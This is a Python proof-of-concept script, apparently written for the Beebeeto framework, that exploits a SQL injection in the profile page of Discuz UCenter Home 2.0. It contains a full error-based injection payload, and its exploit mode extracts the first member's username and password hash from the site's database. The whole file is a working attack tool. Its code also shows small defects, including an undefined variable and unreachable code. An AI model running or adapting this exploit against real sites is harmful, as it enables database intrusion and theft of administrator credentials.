#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0004',  # 由Beebeeto官方编辑
            'name': 'UCHome 2.0 /source/cp_profile.php SQL注入漏洞 POC',  # 名称
            'author': 'windows95',  # 作者
            'create_date': '2014-08-05',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer3_protocol': ['tcp'],  # 该协议所使用的第三层协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Discuz UCenter Home',  # 漏洞所涉及的应用名称
            'vul_version': ['2.0'],  # 受漏洞影响的应用版本
            'type': 'SQL Injection',  # 漏洞类型
            'tag': ['UCenter Home', 'sql', 'SQL注入漏洞'],  # 漏洞相关tag
            'desc': 'UCHOME 修改个人资料处 info 参数未经过过滤导致 SQL 注入漏洞的发生，可以获取管理员的账号密码。',  # 漏洞描述
            'references': ['http://wooyun.org/bugs/wooyun-2014-069193',  # 参考链接
                           ],
        },
    }

    def _init_user_parser(self):  # 定制命令行参数
        self.user_parser.add_option('-c','--cookie',
                                    action='store', dest='cookie', type='string', default=None,
                                    help='this poc need to login, so special cookie '
                                         'for target must be included in http headers.')

    @classmethod
    def verify(cls, args):  # 实现验证模式的主函数
        payload = 'name=&marry=1&friend%5Bmarry%5D=0&birthyear=1989&birthmonth=2&birthday=1&friend%5B' \
                  'birth%5D=0&blood=A&friend%5Bblood %5D=0&birthprovince=%C7%E0%BA%A3&birthcity=%B5%C' \
                  '2%C1%EE%B9%FE&friend%5Bbirthcity%5D=0&resideprovince=%C7%E0%BA%A3&residec ity=%B5%' \
                  'C2%C1%EE%B9%FE&friend%5Bresidecity%5D=0&profilesubmit=%B1%A3%B4%E6&formhash={hash}' \
                  '&info[0\',0,(select (1) from mysql.user where 1%3d1 and (SELECT 1 FROM (select cou' \
                  'nt(*),concat(floor(rand(0)*2),(substring((Select (md5(56311223))),1,62))) a from i' \
                  'nformation_schema.tables group by a)b)))#]=aaa'

        vul_url = '{url}/cp.php?ac=profile&op=info&ref'.format(url=args['options']['target'])
        hash_url = '{url}/cp.php?ac=profile&op=base'.format(url=args['options']['target'])
        match_hash = re.compile('name="formhash" value="([\d\w]+)"')

        if args['options']['verbose']:  # 是否需要输出详细信息
            print '[*] {url} - Getting formhash ...'.format(url=args['options']['target'])
        request = urllib2.Request(hash_url, headers={'Cookie': args['options']['cookie']})  # 调用传入的cookie
        response = urllib2.urlopen(request).read()
        form_hash = match_hash.findall(response)
        if not form_hash:
            args['success'] = False
            return args
            raise Exception("Get the formhash fail!")

        if args['options']['verbose']:
            print '[*] {url} - The formhash is {form_hash}'.format(url=args['options']['target'], form_hash=form_hash[0])
            print '[*] {url} - Executing payload ...'.format(url=args['options']['target'])
        request = urllib2.Request(url=vul_url, headers={'Cookie': args['options']['cookie']}, data=payload.format(hash=form_hash[0]))
        response = urllib2.urlopen(request).read()
        if '14c711768474fac3bf03094625bc1aeaa' in response:
            args['success'] = True
            args['poc_ret']['vul_url'] = args['options']['target']
            return args
        else:
            args['success'] = False
            return args

    @classmethod
    def exploit(cls, args):  # 实现exploit模式的主函数
        vul_url = '{url}/cp.php?ac=profile&op=info&ref'.format(url=args['options']['target'])
        hash_url = '{url}/cp.php?ac=profile&op=base'.format(url=args['options']['target'])
        match_hash = re.compile('name="formhash" value="([\d\w]+)"')

        payload = 'name=&marry=1&friend%5Bmarry%5D=0&birthyear=1989&birthmonth=2&birthday=1&friend%5B' \
                  'birth%5D=0&blood=A&friend%5Bblood %5D=0&birthprovince=%C7%E0%BA%A3&birthcity=%B5%C' \
                  '2%C1%EE%B9%FE&friend%5Bbirthcity%5D=0&resideprovince=%C7%E0%BA%A3&residec ity=%B5%' \
                  'C2%C1%EE%B9%FE&friend%5Bresidecity%5D=0&profilesubmit=%B1%A3%B4%E6&formhash={hash}' \
                  '&info[0\',0,(select (1) from mysql.user where 1%3d1 and (SELECT 1 FROM (select cou' \
                  'nt(*),concat(floor(rand(0)*2),(substring((Select (select concat(username,0x3a3a,pa' \
                  'ssword) from uchome_member limit 0,1)),1,62))) a from information_schema.tables gr' \
                  'oup by a)b)))#]=aaa'
        if args['options']['verbose']:
            print '[*] {url} - Getting formhash ...'.format(url=args['options']['target'])
        request = urllib2.Request(hash_url, headers={'Cookie': args['options']['cookie']})
        response = urllib2.urlopen(request).read()
        form_hash = match_hash.findall(response)
        if not form_hash:
            args['success'] = False
            return args
            raise Exception("Get the formhash fail!")
        if verbose:
            print '[*] {url} - The formhash is {form_hash}'.format(url=args['options']['target'], form_hash=form_hash[0])
            print '[*] {url} - Executing payload ...'.format(url=args['options']['target'])
        request = urllib2.Request(url=vul_url, headers={'Cookie': args['options']['cookie']}, data=payload.format(hash=form_hash[0]))
        response = urllib2.urlopen(request).read()
        match_data = re.compile('entry \'1(.*)::([\w\d]{32})\' for')
        data = match_data.findall(response)

        if data:
            args['success'] = True
            args['poc_ret']['username'] = data[0][0]
            args['poc_ret']['password'] = data[0][1]
            return args
        else:
            args['success'] = False
            return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
